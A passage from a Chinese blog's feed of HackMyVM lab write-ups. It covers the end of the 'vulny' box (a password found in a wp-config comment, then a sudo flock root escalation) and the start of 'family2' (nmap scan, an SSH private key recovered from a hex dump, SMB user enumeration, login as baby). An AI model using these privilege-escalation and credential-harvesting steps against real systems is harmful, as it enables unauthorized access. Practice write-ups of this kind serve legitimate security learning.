class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>有一个注释<code>/* idrinksomewater */</code>  这个 就是用户的密码，用户在home目录有显示名称<br>查看sudo-l</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> adrian on <span class="symbol">vulny:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> adrian may run the following commands on <span class="symbol">vulny:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/flock</span><br></pre></td></tr></table></figure></div>
<p>用flock 提权<br>在gtfobins找到提权方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure></div>
<p>这个命令的本意是 “解锁 &#x2F; 之后执行 &#x2F;bin&#x2F;sh”，但由于 flock -u &#x2F; 没有实际影响，它相当于：<br><code>sudo /bin/sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/flock / /bin/bash</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="built_in">cat</span> /root/*.txt</span><br><span class="line">HMVididit</span><br></pre></td></tr></table></figure></div>
<p>完成</p>
<p>总结：我遇到的一些卡点：1.搜索secret目录下的二级目录 2.找到插件的漏洞利用脚本  3.用出了nc -e的另一种方法反弹shell<br>学习到了： 1.<code>python3 -m http.server</code> 开启一个http服务 让web可以用wget接收脚本  2.reverse.sh的利用，接收之后用bash执行 3.wordpress题目去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中看看 4.flock提权</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family2</title>
    <url>/posts/55076.html</url>
    <content><![CDATA[<p>HMV-family2靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67ada769d0e0a243d4fed2c0.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.61  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span> <span class="number">16</span>:<span class="number">11</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line">Host is up (<span class="number">0.0028</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">991</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>  open  ssh         OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:f1:ed:<span class="number">84</span>:cc:<span class="number">41</span>:<span class="number">8</span>c:<span class="number">7</span>e:c6:<span class="number">92</span>:a9:b4:<span class="number">29</span>:<span class="number">57</span>:bf:d1 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>f:f3:<span class="number">93</span>:db:<span class="number">72</span>:ff:cd:<span class="number">4</span>d:<span class="number">5</span>f:<span class="number">09</span>:<span class="number">3</span>e:dc:<span class="number">13</span>:<span class="number">36</span>:<span class="number">49</span>:<span class="number">23</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> e7:a3:<span class="number">72</span>:dd:d5:af:e2:b5:<span class="number">77</span>:<span class="number">50</span>:ab:<span class="number">3</span>d:<span class="number">27</span>:<span class="number">12</span>:<span class="number">0</span>f:ea (ED25519)</span><br><span class="line"><span class="number">25</span><span class="symbol">/tcp</span>  open  smtp        Postfix smtpd</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_smtp-commands:</span> debian.numericable.fr, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>  open  http        Apache httpd <span class="number">2.4</span>.<span class="number">51</span></span><br><span class="line">|<span class="params">_http-title:</span> Index of <span class="symbol">/</span></span><br><span class="line">| <span class="params">http-ls:</span> Volume <span class="symbol">/</span></span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| <span class="number">11</span>K   <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span> <span class="number">16</span>:<span class="number">25</span>  nicegiftformybaby</span><br><span class="line">|_</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.51</span> (Debian)</span><br><span class="line"><span class="number">110</span><span class="symbol">/tcp</span> open  pop3        Dovecot pop3d</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_pop3-capabilities:</span> TOP USER CAPA UIDL RESP-CODES PIPELINING SASL(PLAIN) AUTH-RESP-CODE STLS</span><br><span class="line"><span class="number">139</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">143</span><span class="symbol">/tcp</span> open  imap        Dovecot imapd</span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS more SASL-IR ENABLE LITERAL<span class="operator">+</span> STARTTLS AUTH<span class="operator">=</span>PLAINA0001 listed post-login capabilities IDLE ID OK Pre-login have IMAP4rev1</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line"><span class="number">445</span><span class="symbol">/tcp</span> open  netbios-ssn Samba smbd <span class="number">4</span></span><br><span class="line"><span class="number">993</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/imap</span>    Dovecot imapd</span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_imap-capabilities:</span> LOGIN-REFERRALS SASL-IR ENABLE LITERAL<span class="operator">+</span> more IMAP4rev1 listed post-login capabilities IDLE AUTH<span class="operator">=</span>PLAINA0001 OK Pre-login have ID</span><br><span class="line"><span class="number">995</span><span class="symbol">/tcp</span> open  ssl<span class="symbol">/pop3</span>    Dovecot pop3d</span><br><span class="line">| <span class="params">ssl-cert:</span> <span class="params">Subject:</span> commonName<span class="operator">=</span>debian</span><br><span class="line">| Subject Alternative <span class="params">Name:</span> DNS:debian</span><br><span class="line">| Not valid <span class="params">before:</span> <span class="number">202</span>1-<span class="number">1</span>0-<span class="number">31</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|_Not valid <span class="params">after:</span>  <span class="number">203</span>1-<span class="number">1</span>0-<span class="number">29</span>T13:<span class="number">31</span>:<span class="number">43</span></span><br><span class="line">|<span class="params">_ssl-date:</span> TLS randomness does not represent time</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>E:<span class="number">78</span>:<span class="number">10</span>:<span class="number">7</span>B:<span class="number">5</span>C:A0 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">Hosts:</span>  debian.numericable.fr, <span class="number">127.0</span>.<span class="number">0.1</span>; <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script <span class="params">results:</span></span><br><span class="line">| <span class="params">smb2-security-mode:</span> </span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|<span class="params">_nbstat:</span> NetBIOS <span class="params">name:</span> FAMILY2, NetBIOS <span class="params">user:</span> <span class="symbol">&lt;unknown&gt;</span>, NetBIOS <span class="params">MAC:</span> <span class="symbol">&lt;unknown&gt;</span> (unknown)</span><br><span class="line">| <span class="params">smb2-time:</span> </span><br><span class="line">|   <span class="params">date:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span>T08:<span class="number">12</span>:<span class="number">12</span></span><br><span class="line">|_  <span class="params">start_date:</span> N<span class="symbol">/A</span></span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.79</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.61</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">30.07</span> seconds</span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure></div>
<p>开了很多端口，老规矩先去80看看，如果没有什么信息就去其他端口看看</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>直接访问80可以读取一个一个文件，里面是ssh的私钥<br><img src="https://pic1.imgdb.cn/item/67adaa59d0e0a243d4fed3d8.png"><br>这个是私钥文件的十六进制转储<code>xxd -r</code>可以转换回原始的私钥文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># xxd -r tmp &gt; id_rsa</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># cat id_rsa       </span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAzZOTX1iTqzbIE7J3dr19v4jvvF2kr5lc8AakvHnEjksjGZlcCKai</span><br><span class="line">ajQj<span class="operator">+</span><span class="number">3</span>GdXLfWV5ErRfDKdeYlNNhjJvEGDZVT1JHm9VaB4cWsEjr5SlGcu<span class="symbol">/ciQmgTiU5rSs</span></span><br><span class="line"><span class="number">2</span>Iqc91FrWaNmIgcWeirQRPFrUOFqCm6aqfOAkchQA7e02GMRQ3a087zoOGzOHARPWnHMDG</span><br><span class="line">jaXZSTrdILKagQ1L59S55z<span class="operator">+</span>x3P5PAdCR2<span class="operator">+</span>uxujohsnk8HI6ZxaeEnbIMM8qJKdTipn<span class="symbol">/iB7</span></span><br><span class="line"><span class="number">3</span>gCMrFb4mMDgk58ALng7tG95df2MTVSUzKwH<span class="symbol">/ZpD/iOWow5uwauOu+cVC/G7rPWwgw3Lht</span></span><br><span class="line">ZBFCQ1w0EPFnEDIuoGbFUp1jObUtYEAAnUGiD9xEj2wW8RtS<span class="operator">+</span>RovSNoEZUk<span class="symbol">/sywHMFdMOS</span></span><br><span class="line">xTGPZf6YseS80B3jYCkVuUXvO6E3ioIZ6O1rkXIPLLddCjaXTWR3yA<span class="symbol">/0z7hIFvYdaNPuW9</span></span><br><span class="line">xE26DWLJApZImkK1YcTqFNzQCBdXh4WV<span class="symbol">/8TfEAQ1AAAFgG7azt5u2s7eAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAM2Tk19Yk6s2yBOyd3a9fb<span class="operator">+</span>I77xdpK<span class="operator">+</span>ZXPAGpLx5xI5LIxmZXAimomo0I<span class="symbol">/txnVy3</span></span><br><span class="line"><span class="number">1</span>leRK0XwynXmJTTYYybxBg2VU9SR5vVWgeHFrBI6<span class="operator">+</span>UpRnLv3IkJoE4lOa0rNiKnPdRa1mj</span><br><span class="line">ZiIHFnoq0ETxa1DhagpumqnzgJHIUAO3tNhjEUN2tPO86DhszhwET1pxzAxo2l2Uk63SCy</span><br><span class="line">moENS<span class="operator">+</span>fUuec<span class="symbol">/sdz+TwHQkdvrsbo6IbJ5PByOmcWnhJ2yDDPKiSnU4qZ/4ge94AjKxW+JjA</span></span><br><span class="line"><span class="number">4</span>JOfAC54O7RveXX9jE1UlMysB<span class="symbol">/2aQ/4jlqMObsGrjrvnFQvxu6z1sIMNy4bWQRQkNcNBDx</span></span><br><span class="line">ZxAyLqBmxVKdYzm1LWBAAJ1Bog<span class="symbol">/cRI9sFvEbUvkaL0jaBGVJP7MsBzBXTDksUxj2X+mLHk</span></span><br><span class="line">vNAd42ApFblF7zuhN4qCGejta5FyDyy3XQo2l01kd8gP9M<span class="operator">+</span><span class="number">4</span>SBb2HWjT7lvcRNug1iyQKW</span><br><span class="line">SJpCtWHE6hTc0AgXV4eFlf<span class="symbol">/E3xAENQAAAAMBAAEAAAGAbNgFAEd6r/0qQ9uLCvBbQuzy2Y</span></span><br><span class="line"><span class="number">3</span>PIzYVEfTChhQGsLwxkl0zcFUhyw9eOcQ26B9hui1fdwF9gJzg<span class="operator">+</span>DDVlomohcqZfwPc<span class="symbol">/+rU</span></span><br><span class="line">i8BIUcKtuN6rGI5JslU<span class="operator">+</span>esVtY0adZCM2QFbYlpCv0rtnUynj4gbstahLl45CDL4uPnEYDT</span><br><span class="line">nHofatPQDPjpDu701bqmdSGpQqzFaSTAaBi81kpo1usglcgIal2nc<span class="symbol">/R5uxjnolOI+Mxd0Q</span></span><br><span class="line">qaIK4q7GNWROt6E1rFNM1gaY<span class="operator">+</span>qmk1RHrPM0CLzp50ZHfR1fu4UKQuNIkBd9<span class="operator">+</span>wHC940EIDe</span><br><span class="line">Zx5Sv<span class="symbol">/oW1TWH0VWgFnO543LKn0aCawi6Qjyb1HpIOPbxo0ydyHl4YFlURRmrIiCctoLftp</span></span><br><span class="line">sbBcuf1CG9DFa5dEkBySxVzSG3DfTsOY6a9V0wZx2BZALRE07r61SzIRztXYXYiBM2Dzln</span><br><span class="line">AzONdkuRwXd3BuThjpllQmvZy24VFJWU<span class="operator">+</span>wumRfTB6gsqzyhyH9<span class="symbol">/VVpfC37/r9NGvDBAAAA</span></span><br><span class="line">wGUMzm9KkwoR477ZkKE<span class="operator">+</span>ItNQG<span class="symbol">/J1/9cG7ToLPDoSXc2lKnm181cE01FD8aQLM1ChBr4ahz</span></span><br><span class="line">tG<span class="operator">+</span>zg65VYXSFB3N0O9Mp0u9qc7Xc1h30SOdqm62T1K<span class="operator">+</span>nvHe2tXkNNEyEVxAAcSV1jr2HEm</span><br><span class="line">MTN66K0Mey5Iet23nUBZJOamFZTpj7fMZxDxTJq1jNUviDm6LgNdFIvgeRZQBRcVMHEf5g</span><br><span class="line">qjrDw8qoXn<span class="symbol">/ReLEYuPjLL8Up6hAxGCTcYU3HfpbsNv0xl2sQAAAMEA9lHGSQe0o4bQZmKs</span></span><br><span class="line">YwQjewX38Hs6SKop4Ci1OGNGeMaJI<span class="symbol">/6lxcouI95CZSNPRq3KNS4jKBYMCjoRQrisnNQLnL</span></span><br><span class="line">dVsk<span class="symbol">/sMjhs/NiXGHKZhUbv4e9vYxbuDZKQpbF9juSXt2DmA5zTLejPavBDVvE0uwVGq1uN</span></span><br><span class="line">xRna<span class="symbol">/yiBFZudgJMmkLIBcMClmZFoEFqBsWL5VjtZJZpWYCpYIedkeZDxPrgSO1LCTq9Rsq</span></span><br><span class="line">bKDlZoZfxvYtzbYK9nscdCljbKqCcRAAAAwQDVp<span class="operator">+</span>KeBCnL9T3qQmwZ<span class="operator">+</span>eNSUoTH6TCYwNOW</span><br><span class="line">EQTsW<span class="operator">+</span>srp8SNg2H0BB0HjLxzeHvBHBIZ2ye9L8G<span class="symbol">/XpsIM7aASbtaXChT6FqYT4Bb1pi067</span></span><br><span class="line"><span class="operator">+</span>LTxGM8HADjynVCWLnIKDzAAHBZHOwBwGwK6O1NDiFEor99Uqif7<span class="symbol">/YJACsP70lEOfL2rqk</span></span><br><span class="line">n1IGU2C9mjIUWVlU2V31bcGBZ4PI9d88oH46FeWloMvEpnVRIk8Q6<span class="operator">+</span>sdGke0yjB9TeDfL6</span><br><span class="line">O<span class="attr">CBlxZRwxH8uUAAAALYmFieUBkZWJpYW4</span><span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>本来想直接用hydra爆破ssh，但是这里不能直接用密码登录ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh root@<span class="number">192.168</span>.<span class="number">112.61</span>          </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.112.61 (192.168.112.61)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:<span class="number">6</span>HwEGo4iDv1jBtZC87BkDOsTnZ+MUZAnS9pq7IEaNCo.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.112.61&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">root@<span class="number">192.168</span>.<span class="number">112.61</span>: Permission denied (publickey).</span><br></pre></td></tr></table></figure></div>
<p>目录扫描了一波，没有信息。<br>那就继续回到扫描的端口里面找信息，这里看到还有一个smb，所以用enum4linux扫一下 用<code>-a</code>参数把基本的都扫一下<br>扫出来了三个用户名，一家人</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">[+] Enumerating users using SID S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span> and logon username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1000</span> Unix User\dad (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1001</span> Unix User\mum (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1002</span> Unix User\baby (Local User)</span><br></pre></td></tr></table></figure></div>
<p>然后用刚刚的私钥去尝试一下<br>成功登录baby的shell</p>
